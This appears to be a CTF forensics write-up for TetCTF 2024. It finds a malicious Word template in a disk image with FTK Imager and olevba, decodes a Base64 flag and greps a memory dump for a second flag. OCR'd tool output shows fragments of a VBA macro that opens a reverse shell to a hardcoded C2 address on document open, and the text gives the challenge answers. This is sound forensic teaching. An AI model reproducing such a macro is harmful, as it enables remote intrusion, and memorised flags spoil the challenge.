# TET & 4N6
> Tet is coming, TetCTF is coming again. Like every year, I continued to register to play CTF, read the rules to prepare for the competition. After reading the rules, my computer seemed unusual, it seemed like it was infected with malicious code somewhere. Can you find out?
> Find the malicious code and tell me the IP and Port C2
> What was the first flag you found?
> After registering an account, I no longer remember anything about my account. Can you help me find and get the second flag?
> Format : TetCTF{IP:Port_Flag1_Flag2}

> Ex: TetCTF{1.1.1.1:1234_Hello_HappyForensics}

## About the Challenge
We got 2 files, `Backup.ad1` and `TETCTF-2024-20240126-203010.raw` and we need to find the malicious code, first flag, and the second flag from these 2 forensic artefacts

## How to Solve?

First, we need to find the malicious code. If we open the `Backup.ad1` file using FTK Imager and go to `Roaming/Microsoft/Windows/`, you will find a dotm file.

And if you run `olevba` you will get the ip, port, and the first flag


[Image extracted text: [bash-3
2$
olevba
Normal.dotm
olevba
0.60 _
on
Python
3.10.13
http:/ /decalage.info/python/oletools
FILE:
Normal
dotm
Type:
OpenXML
WARNING
For
now
VBA
stomping
cannot
be
detected
for
files
in memory
VBA
MACRO
ThisDocument
cls
in
file:
word
vbaProject.bin
OLE
stream:
VBA/ ThisDocument
(empty
macro)
VBA
MACRO
NewMacros
bas
in
file:
word/vbaProject.bin
OLE
stream:
VBA
NewMacros
Coppy
Const
ip
"172.20.25.15"
Const port
"444l
Const
INVALID_SOCKET
-1
Const
WSADESCRIPTION
LEN
256
Const
SOCKET_ERROR
-1
Private
Type
WSADATA
WVersion
As Integer
WHighVersion
As Integer
szDescrintion( 0
To
WSADESCRIPTION
LEN)
As
Bvte]


And it the end of the VBA script, there is a Base64 encoded msg


[Image extracted text: Dim
test
As
Long
worked
CreateProc (
vbNullString,
cmd
ByVal
0& ,
ByVal
0& ,
True ,
&h8000000 ,
0 ,
vbNullString,
Si,
pi)
revShell
worked
End
Function
Public
Function
MAKEWORD ( Lo
As
Byte,
Hi
As
Byte)
As Integer
MAKEWORD
Lo
Hi
256&
Or
32768
* (Hi
127)
End
Function
Sub
AutoOpen( )
Dim
success
As
Boolean
success
revShell()
End
Sub
Vmxjd2VFNUhSa2RqUkZwVFZrWndTMVZOZUhkU1JsWlhWRmhvVIdGNlZrbFdSMZhQVkd4R1ZVMUVhejA9
[Type
Keyword
Description
AutoExec
AutoOpen
Runs
when
the
Word
document
is
opened
Suspicious
Call
call
DLL using
Excel
Macros
(XLMIXLF)
Suspicious
Lib
run
code
from
DLL
Suspicious |RtlMoveMemory
May
inject
code
into
another
process
Suspicious
Hex
Strings
Hex-encoded strings
were
detected,
may
be
used
to obfuscate strings
(option
decode
to
see
all)
IOC
172.20.25.15
IPvb
address
IOC
ws2_32.d11
Executable
file
name
May
May]



[Image extracted text: Recipe
Input
+ 0?
Vmxjd2VFNUhSaZRqUkZwVFZrWndTMVZOZUhkU JsWlhWRmhvVldGN ZrbFdSMZhQVkd4RIZVMUVhejAg
From Base64
Alphabet
A-Za-20-9+/=
Remove non-alphabet chars
Strict mode
From Base64
Alphabet
A-Za-20-9+/=
Remove non-alphabet chars
Strict mode
From Base64
Alphabet
ABC
80
TT
Raw Bytes
0
LF
A-Za-20-9+/=
Remove non-alphabet chars
Output
0 0 @ :
Strict mode
FFlag1:
VBA-M4cRO
From Base64
Alphabet
A-Za-20-9+/=
Remove non-alphabet chars
Strict mode]


And I managed to get the second flag using `strings` and `grep`

```
strings TETCTF-2024-20240126-203010.raw | grep "Flag 2"
```


[Image extracted text: [bash-3.2$ strings
TETCTF-2024-20240126-203010
raw
grep "Flag
2"
2 :
R3cOv3rry_34sy_Right?
@Flag
2: R3cOv3rry
Rlght?
Pastebin.com
2 :
R3cOv3rry_34sy_Right?
Pastebin. comE68F4487
2 :
R3cOvarry
Rlght?
Pastebin.com
C7s~
Doco J~r
3/
Fi
Dial+o+
Ie
Flag
34sy _
Flag
Flag
34sy]


```
TetCTF{172.20.25.15:4444_VBA-M4cR0_R3c0v3rry_34sy_R1ght?}
```